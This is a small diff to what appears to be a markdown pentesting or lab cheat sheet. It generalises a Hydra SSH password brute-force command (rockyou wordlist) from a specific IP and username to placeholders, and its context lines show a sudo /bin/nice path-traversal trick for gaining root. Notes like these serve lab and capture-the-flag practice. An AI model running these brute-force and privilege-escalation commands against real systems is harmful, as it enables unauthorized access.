@@ -50,7 +50,7 @@
   - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.
 
 - ## Hydra <a name="hydra"></a>
-- hydra -l renu -P /usr/share/wordlists/rockyou.txt 192.168.157.230 ssh -t 50
+- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
 
 
 - ## FTP <a name="ftp"></a>
